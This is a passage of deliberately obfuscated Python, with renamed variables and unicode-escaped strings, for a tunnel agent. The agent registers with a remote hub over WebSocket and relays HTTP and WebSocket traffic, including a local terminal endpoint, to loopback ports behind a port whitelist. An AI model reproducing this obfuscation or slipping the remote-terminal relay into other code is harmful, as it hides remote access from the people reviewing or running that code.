        return {codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): self.status, codecs.decode('\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'): self.source, codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): self.hub_url, codecs.decode('\\u0072\\u0065\\u0073\\u006f\\u006c\\u0076\\u0065\\u0064\\u005f\\u0068\\u0075\\u0062', 'unicode_escape'): self.resolved_hub, codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self.kname, codecs.decode('\\u0075\\u0072\\u006c', 'unicode_escape'): self.relay_url, codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): self.public_url or self.resolved_hub or self.hub_url, codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): sorted(self.ports), codecs.decode('\\u0063\\u006f\\u006e\\u0073\\u0065\\u0063\\u0075\\u0074\\u0069\\u0076\\u0065\\u005f\\u0066\\u0061\\u0069\\u006c\\u0075\\u0072\\u0065\\u0073', 'unicode_escape'): self.consecutive_failures, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): self.last_error, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072\\u005f\\u0061\\u0074', 'unicode_escape'): self.last_error_at, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): self.last_connected_at, codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): O0_var_1677}

    def wait_connected(self, timeout=15.0):
        O0_var_1678 = time.time() + max(1.0, float(timeout))
        while time.time() < O0_var_1678:
            if self._stop.is_set():
                return (False, ConnectionError(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')))
            if self._register_error is not None:
                return (False, self._register_error)
            if self.status == codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape'):
                return (True, None)
            time.sleep(0.2)
        return (False, TimeoutError(codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0020\\u006e\\u006f\\u0074\\u0020\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0025\\u002e\\u0030\\u0066\\u0073', 'unicode_escape') % float(timeout)))

    def _record_failure(self, message):
        self.consecutive_failures += 1
        self.status = codecs.decode('\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')
        self.last_error = str(message)[:300]
        self.last_error_at = datetime.now(timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))

    def _backoff(self):
        return min(self._retry_base * 2 ** max(0, self.consecutive_failures - 1), self._retry_max)

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True, name=codecs.decode('\\u0068\\u0075\\u0062\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002d\\u0025\\u0073', 'unicode_escape') % self.kname)
        self._thread.start()

    def stop(self):
        self._stop.set()
        O0_var_1679, O0_var_1680 = (self._loop, self._main_task)
        if O0_var_1679 is not None and O0_var_1680 is not None and O0_var_1679.is_running():
            try:
                O0_var_1679.call_soon_threadsafe(O0_var_1680.cancel)
            except RuntimeError:
                pass
        if self._thread is not None:
            self._thread.join(timeout=3.0)

    def _run(self):
        O0_var_1681 = asyncio.new_event_loop()
        asyncio.set_event_loop(O0_var_1681)
        self._loop = O0_var_1681

        async def _entry():
            self._main_task = asyncio.current_task()
            await self._run_loop()
        try:
            O0_var_1681.run_until_complete(_entry())
        except asyncio.CancelledError:
            pass
        except Exception as exc:
            self._record_failure(exc)
            self.status = codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
        finally:
            try:
                O0_var_1681.run_until_complete(O0_var_1681.shutdown_asyncgens())
            except Exception:
                pass
            O0_var_1681.close()
            self._loop = None
            self._main_task = None

    async def _run_loop(self):
        O0_var_1682 = aiohttp.TCPConnector(limit=16)
        async with aiohttp.ClientSession(connector=O0_var_1682, auto_decompress=False, timeout=aiohttp.ClientTimeout(total=None)) as O0_var_1683:
            while not self._stop.is_set():
                try:
                    await self._connect_once(O0_var_1683)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    self._record_failure(exc)
                    if isinstance(exc, HubRegisterError):
                        self._register_error = exc
                    else:
                        self._register_error = None
                if self._stop.is_set():
                    break
                O0_var_1684 = self._backoff()
                self.log.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u96a7\\u9053\\u65ad\\u5f00\\u0020\\u0028', 'unicode_escape') + str(self.last_error) + codecs.decode('\\u0029\\u002c\\u0020', 'unicode_escape') + format(O0_var_1684, codecs.decode('\\u002e\\u0031\\u0066', 'unicode_escape')) + codecs.decode('\\u0073\\u0020\\u540e\\u7b2c\\u0020', 'unicode_escape') + str(self.consecutive_failures) + codecs.decode('\\u0020\\u6b21\\u91cd\\u8fde', 'unicode_escape'))
                await self._interruptible_sleep(O0_var_1684)

    async def _interruptible_sleep(self, O0_var_1685):
        O0_var_1686 = time.time() + O0_var_1685
        while not self._stop.is_set() and time.time() < O0_var_1686:
            await asyncio.sleep(min(0.25, max(0.0, O0_var_1686 - time.time())))

    async def _connect_once(self, O0_var_1687):
        O0_var_1688 = O0_fn_46(self.hub_url)
        if O0_var_1688:
            raise ConnectionError(O0_var_1688)
        O0_var_1689 = self.hub_url
        if O0_fn_1(self.hub_url):
            O0_var_1689 = await O0_fn_48(O0_var_1687, self.hub_url, self._request)
        self.resolved_hub = O0_var_1689
        self.relay_url = codecs.decode('\\u0025\\u0073\\u002f\\u0025\\u0073', 'unicode_escape') % (self.public_url or O0_var_1689, self.kname)
        O0_var_1690 = self._ws_factory or (lambda s, url: s.ws_connect(url, autoping=True, timeout=None))
        async with O0_var_1690(O0_var_1687, O0_fn_49(O0_var_1689)) as O0_var_1691:
            O0_var_1692 = {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0076', 'unicode_escape'): 1, codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): self.kname, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): sorted(self.ports)}
            O0_var_1692[codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0075\\u0072\\u006c', 'unicode_escape')] = self.public_url or O0_var_1689
            await self._send(O0_var_1691, O0_var_1692)
            O0_var_1693 = await O0_var_1691.receive(timeout=15)
            if O0_var_1693.type != aiohttp.WSMsgType.TEXT:
                raise ConnectionError(codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u6ce8\\u518c\\u5e94\\u7b54\\u5f02\\u5e38\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1693.type)
            O0_var_1694 = json.loads(O0_var_1693.data)
            if not O0_var_1694.get(codecs.decode('\\u006f\\u006b', 'unicode_escape')):
                raise HubRegisterError(O0_var_1694.get(codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')), O0_var_1694.get(codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
            self.status = codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')
            self.consecutive_failures = 0
            self.last_error = None
            self.last_connected_at = datetime.now(timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))
            self.log.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u0033\\u005d\\u0020\\u2705\\u0020\\u5df2\\u8fde\\u63a5\\u0020\\u0068\\u0075\\u0062\\u0020', 'unicode_escape') + str(self.resolved_hub) + codecs.decode('\\u0020\\u0028\\u6ce8\\u518c\\u540d\\u0020', 'unicode_escape') + str(self.kname) + codecs.decode('\\u002c\\u0020\\u4e2d\\u7ee7\\u5730\\u5740\\u0020', 'unicode_escape') + str(self.relay_url) + codecs.decode('\\u0029', 'unicode_escape'))
            await self._pump(O0_var_1687, O0_var_1691)

    async def _send(self, O0_var_1695, O0_var_1696):
        async with self._ws_lock:
            await O0_var_1695.send_json(O0_var_1696)

    async def _pump(self, O0_var_1697, O0_var_1698):
        O0_var_1699 = {}
        O0_var_1700 = {}
        O0_var_1701 = asyncio.create_task(self._ping_loop(O0_var_1698))
        try:
            while not self._stop.is_set():
                O0_var_1702 = await O0_var_1698.receive()
                if O0_var_1702.type == aiohttp.WSMsgType.TEXT:
                    try:
                        O0_var_1703 = json.loads(O0_var_1702.data)
                    except ValueError:
                        continue
                    O0_var_1704 = O0_var_1703.get(codecs.decode('\\u0074', 'unicode_escape'))
                    if O0_var_1704 == codecs.decode('\\u0070\\u006f\\u006e\\u0067', 'unicode_escape'):
                        continue
                    if O0_var_1704 == codecs.decode('\\u0072\\u0065\\u0071', 'unicode_escape'):
                        O0_var_1705 = int(O0_var_1703.get(codecs.decode('\\u0069\\u0064', 'unicode_escape')) or 0)
                        O0_var_1706 = asyncio.create_task(self._handle_req(O0_var_1697, O0_var_1698, O0_var_1703))
                        O0_var_1699[O0_var_1705] = O0_var_1706
                        O0_var_1706.add_done_callback(lambda _t, _rid=O0_var_1705: O0_var_1699.pop(_rid, None))
                    elif O0_var_1704 == codecs.decode('\\u0077\\u0073\\u005f\\u006f\\u0070\\u0065\\u006e', 'unicode_escape'):
                        O0_var_1707 = int(O0_var_1703.get(codecs.decode('\\u0069\\u0064', 'unicode_escape')) or 0)
                        O0_var_1708 = HubWSStream(self, O0_var_1697, O0_var_1698, O0_var_1707, O0_var_1703)
                        O0_var_1700[O0_var_1707] = O0_var_1708
                        O0_var_1708.start()
                    elif O0_var_1704 == codecs.decode('\\u0077\\u0073\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'):
                        O0_var_1708 = O0_var_1700.get(int(O0_var_1703.get(codecs.decode('\\u0069\\u0064', 'unicode_escape')) or 0))
                        if O0_var_1708 is not None:
                            O0_var_1708.from_hub(O0_var_1703)
                    elif O0_var_1704 == codecs.decode('\\u0077\\u0073\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape'):
                        O0_var_1708 = O0_var_1700.pop(int(O0_var_1703.get(codecs.decode('\\u0069\\u0064', 'unicode_escape')) or 0), None)
                        if O0_var_1708 is not None:
                            O0_var_1708.close_from_hub(O0_var_1703)
                elif O0_var_1702.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSING, aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                    raise ConnectionError(codecs.decode('\\u0068\\u0075\\u0062\\u0020\\u8fde\\u63a5\\u5173\\u95ed\\u002f\\u9519\\u8bef\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1702.type.name)
        finally:
            O0_var_1701.cancel()
            for O0_var_1706 in O0_var_1699.values():
                O0_var_1706.cancel()
            for O0_var_1708 in O0_var_1700.values():
                O0_var_1708.stop()

    async def _ping_loop(self, O0_var_1709):
        try:
            while True:
                await asyncio.sleep(self._ping_interval)
                if self._stop.is_set():
                    return
                await self._send(O0_var_1709, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape')})
        except asyncio.CancelledError:
            raise
        except Exception:
            return

    async def _handle_req(self, O0_var_1710, O0_var_1711, O0_var_1712):
        O0_var_1713 = int(O0_var_1712.get(codecs.decode('\\u0069\\u0064', 'unicode_escape')) or 0)
        O0_var_1714 = O0_var_1712.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape')) or codecs.decode('\\u0061\\u0070\\u0069', 'unicode_escape')
        O0_var_1715 = str(O0_var_1712.get(codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')) or codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')).upper()
        O0_var_1716 = O0_var_1712.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')) or codecs.decode('\\u002f', 'unicode_escape')
        O0_var_1717 = O0_var_1712.get(codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0079', 'unicode_escape')) or codecs.decode('', 'unicode_escape')
        O0_var_1718 = base64.b64decode(O0_var_1712.get(codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('', 'unicode_escape')) if O0_var_1712.get(codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')) else b''
        with self._count_lock:
            self.relay_count += 1
        try:
            if O0_var_1714 == codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'):
                O0_var_1719 = int(O0_var_1712.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')) or 0)
                O0_var_1720 = O0_fn_65(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'))
            else:
                O0_var_1719 = self.port
                O0_var_1720 = None
            O0_var_1721, O0_var_1722, O0_var_1723 = await O0_fn_52(O0_var_1710, port=O0_var_1719, whitelist=O0_var_1720, method=O0_var_1715, path=O0_var_1716, query=O0_var_1717, headers=O0_var_1712.get(codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')), body=O0_var_1718, relay_timeout=self._relay_timeout, max_body=self._max_body, request_fn=self._request)
            await self._send(O0_var_1711, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0073', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): O0_var_1713, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): int(O0_var_1721), codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): O0_var_1722, codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(O0_var_1723).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))})
        except LoopbackRelayError as exc:
            try:
                await self._send_err(O0_var_1711, O0_var_1713, exc.code, exc.message)
            except Exception:
                pass
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            try:
                await self._send_err(O0_var_1711, O0_var_1713, codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0075\\u006e\\u0072\\u0065\\u0061\\u0063\\u0068\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'), str(exc)[:300])
            except Exception:
                pass

    async def _send_err(self, O0_var_1724, O0_var_1725, code, message):
        await self._send(O0_var_1724, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): O0_var_1725, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): code, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): message})

class HubWSStream:
    codecs.decode('\\u5355\\u6761\\u0020\\u0057\\u0053\\u0020\\u6d41\\u003a\\u0020\\u56de\\u73af\\u62e8\\u53f7\\u672c\\u5730\\u670d\\u52a1\\u002c\\u0020\\u0068\\u0075\\u0062\\u2194\\u006c\\u006f\\u0063\\u0061\\u006c\\u0020\\u5e27\\u7ea7\\u53cc\\u5411\\u8f6c\\u53d1\\u0020\\u0028\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079\\u002f\\u0074\\u0065\\u0078\\u0074\\u0020\\u4fdd\\u771f\\u0029\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e24\\u79cd\\u6a21\\u5f0f\\u0020\\u0028\\u0077\\u0073\\u005f\\u006f\\u0070\\u0065\\u006e\\u0020\\u5e27\\u7684\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u5b57\\u6bb5\\u533a\\u5206\\u002c\\u0020\\u0030\\u002e\\u0036\\u002e\\u0036\\u0020\\u7eed\\u6279\\u0029\\u003a\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u0061\\u0070\\u0069\\u0020\\u6a21\\u5f0f\\u0020\\u0028\\u65e0\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u002f\\u0020\\u0070\\u006f\\u0072\\u0074\\u003d\\u0030\\u0029\\u003a\\u0020\\u56de\\u73af\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u81ea\\u8eab\\u0020\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u002a\\u0020\\u0028\\u7ec8\\u7aef\\u002c\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u002f\\u4ee4\\u724c\\u900f\\u4f20\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u7aef\\u53e3\\u53cd\\u4ee3\\u6a21\\u5f0f\\u0020\\u0028\\u0070\\u006f\\u0072\\u0074\\u003e\\u0030\\u0029\\u003a\\u0020\\u56de\\u73af\\u0020\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d\\u0020\\u2014\\u0020\\u004b\\u0048\\u0055\\u0042\\u005f\\u0050\\u004f\\u0052\\u0054\\u0053\\u0020\\u767d\\u540d\\u5355\\u6821\\u9a8c\\u0020\\u0028\\u62d2\\u7edd\\u65f6\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0073\\u005f\\u0061\\u0063\\u006b\\u0020\\u006f\\u006b\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u002c\\u0020\\u0068\\u0075\\u0062\\u0020\\u4ee5\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0020\\u0033\\u0030\\u0030\\u0031\\u0020\\u5173\\u5ba2\\u6237\\u7aef\\u003b\\u0020\\u4e0e\\u0020\\u0048\\u0054\\u0054\\u0050\\u0020\\u7aef\\u53e3\\u53cd\\u4ee3\\u540c\\u8bed\\u4e49\\u002c\\u0020\\u4e0d\\u53d1\\u8d77\\u56de\\u73af\\u8fde\\u63a5\\u0029\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u751f\\u547d\\u5468\\u671f\\u003a\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u0020\\u2192\\u0020\\u005f\\u0072\\u0075\\u006e\\u0028\\u0029\\u0020\\u62e8\\u53f7\\u0020\\u2192\\u0020\\u0077\\u0073\\u005f\\u0061\\u0063\\u006b\\u0020\\u2192\\u0020\\u53cc\\u6cf5\\u0020\\u0028\\u0068\\u0075\\u0062\\u2192\\u006c\\u006f\\u0063\\u0061\\u006c\\u0020\\u002f\\u0020\\u006c\\u006f\\u0063\\u0061\\u006c\\u2192\\u0068\\u0075\\u0062\\u0029\\u0020\\u2192\\u000a\\u0020\\u0020\\u0020\\u0020\\u4efb\\u4e00\\u4fa7\\u5173\\u95ed\\u0020\\u2192\\u0020\\u5411\\u0020\\u0068\\u0075\\u0062\\u0020\\u53d1\\u0020\\u0077\\u0073\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065\\u3002\\u0066\\u0072\\u006f\\u006d\\u005f\\u0068\\u0075\\u0062\\u002f\\u0063\\u006c\\u006f\\u0073\\u0065\\u005f\\u0066\\u0072\\u006f\\u006d\\u005f\\u0068\\u0075\\u0062\\u002f\\u0073\\u0074\\u006f\\u0070\\u0020\\u7531\\u0020\\u005f\\u0070\\u0075\\u006d\\u0070\\u0020\\u8c03\\u7528\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_1726, O0_var_1727, O0_var_1728, O0_var_1729, O0_var_1730):
        self.mgr = O0_var_1726
        self.session = O0_var_1727
        self.hub_ws = O0_var_1728
        self.sid = O0_var_1729
        self.path = O0_var_1730.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')) or codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape')
        self.query = O0_var_1730.get(codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0079', 'unicode_escape')) or codecs.decode('', 'unicode_escape')
        self.port = int(O0_var_1730.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')) or 0)
        self.headers = O0_fn_50(O0_var_1730.get(codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')))
        self.local_ws = None
        self._task = None
        self._from_hub = asyncio.Queue()
        self._stopped = False

    def start(self):
        self._task = asyncio.create_task(self._run())

    def stop(self):
        self._stopped = True
        self._from_hub.put_nowait(None)
        if self.local_ws is not None:
            asyncio.ensure_future(self.local_ws.close(code=1001))

    def from_hub(self, O0_var_1731):
        self._from_hub.put_nowait(O0_var_1731)

    def close_from_hub(self, O0_var_1732):
        self.stop()

    async def _run(self):
        if self.port:
            if self.port not in O0_fn_65(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')):
                try:
                    await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0061\\u0063\\u006b', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u7aef\\u53e3\\u0020\\u0025\\u0064\\u0020\\u672a\\u5728\\u0020\\u0048\\u0055\\u0042\\u0020\\u53cd\\u4ee3\\u767d\\u540d\\u5355', 'unicode_escape') % self.port})
                except Exception:
                    pass
                return
            O0_var_1733 = codecs.decode('\\u0077\\u0073\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064\\u0025\\u0073', 'unicode_escape') % (self.port, self.path)
        else:
            O0_var_1733 = codecs.decode('\\u0077\\u0073\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064\\u0025\\u0073', 'unicode_escape') % (self.mgr.port, self.path)
        if self.query:
            O0_var_1733 += codecs.decode('\\u003f', 'unicode_escape') + self.query
        try:
            if self.mgr._ws_factory is not None:
                O0_var_1734 = self.mgr._ws_factory(self.session, O0_var_1733)
            else:
                O0_var_1734 = self.session.ws_connect(O0_var_1733, autoping=True, timeout=None)
            async with O0_var_1734 as O0_var_1735:
                self.local_ws = O0_var_1735
                await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0061\\u0063\\u006b', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u006f\\u006b', 'unicode_escape'): True})
                O0_var_1736 = asyncio.create_task(self._pump_hub_to_local())
                O0_var_1737 = asyncio.create_task(self._pump_local_to_hub())
                await asyncio.wait({O0_var_1736, O0_var_1737}, return_when=asyncio.FIRST_COMPLETED)
                for O0_var_1738 in (O0_var_1736, O0_var_1737):
                    O0_var_1738.cancel()
                O0_var_1739 = 1000
                try:
                    O0_var_1739 = int(getattr(self.local_ws, codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0065\\u005f\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), None) or 1000)
                except Exception:
                    pass
                if not self._stopped:
                    try:
                        await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u0077\\u0073\\u005f\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_1739, codecs.decode('\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape')})
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            try:
                await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0061\\u0063\\u006b', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): str(exc)[:200]})
            except Exception:
                pass

    async def _pump_hub_to_local(self):
        while True:
            O0_var_1740 = await self._from_hub.get()
            if O0_var_1740 is None:
                return
            O0_var_1741 = base64.b64decode(O0_var_1740.get(codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('', 'unicode_escape')) if O0_var_1740.get(codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')) else b''
            if O0_var_1740.get(codecs.decode('\\u0062\\u0074', 'unicode_escape')) == codecs.decode('\\u0062\\u0069\\u006e', 'unicode_escape'):
                await self.local_ws.send_bytes(O0_var_1741)
            else:
                await self.local_ws.send_str(O0_var_1741.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')))

    async def _pump_local_to_hub(self):
        async for O0_var_1742 in self.local_ws:
            if O0_var_1742.type == aiohttp.WSMsgType.BINARY:
                await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u0062\\u0074', 'unicode_escape'): codecs.decode('\\u0062\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(O0_var_1742.data).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))})
            elif O0_var_1742.type == aiohttp.WSMsgType.TEXT:
                await self.mgr._send(self.hub_ws, {codecs.decode('\\u0074', 'unicode_escape'): codecs.decode('\\u0077\\u0073\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u0069\\u0064', 'unicode_escape'): self.sid, codecs.decode('\\u0062\\u0074', 'unicode_escape'): codecs.decode('\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(O0_var_1742.data.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))})
            elif O0_var_1742.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSING, aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                return

class HubTunnelRegistrar:

    def __init__(self):
        self._items = {}
        self._lock = threading.Lock()

    def register(self, O0_var_1743, O0_var_1744, ports=None, source=codecs.decode('\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063', 'unicode_escape'), wait_timeout=15.0):
        O0_var_1745 = O0_fn_43(O0_var_1744)
        O0_var_1746 = O0_fn_45(O0_var_1743)
        if O0_var_1745:
